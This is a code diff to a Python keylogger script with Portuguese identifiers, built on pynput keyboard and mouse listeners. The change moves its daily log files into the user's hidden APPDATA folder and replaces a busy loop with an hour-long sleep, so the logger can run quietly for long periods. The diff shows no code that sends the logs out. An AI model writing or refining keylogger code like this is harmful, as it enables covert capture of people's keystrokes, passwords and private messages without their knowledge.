@@ -1,17 +1,18 @@
 from pynput import mouse
 from pynput import keyboard
 import datetime
+import time
 import os
 import win32gui
 from screeninfo import get_monitors
 
-try:
-    os.mkdir('./Logs')
-except:
-    pass
 class KeyLogger():
+    try:
+        os.mkdir(os.getenv('APPDATA')+'/Logs')
+    except:
+        pass
     timeStamp = str(datetime.date.today()).replace('-','')
-    def __init__(self, NomeDoArquivo: str = './Logs/'+timeStamp+'.txt') -> None:
+    def __init__(self, NomeDoArquivo: str = os.getenv('APPDATA')+'/Logs/'+timeStamp+'.txt') -> None:
         self.NomeDoArquivo = NomeDoArquivo
         self.j2 = ''
         with open(self.NomeDoArquivo, 'a') as logs:
@@ -63,4 +64,4 @@ if __name__ == '__main__':
     logger.main()
     looper = 0
     while looper == 0:
-        pass
+        time.sleep(3600)
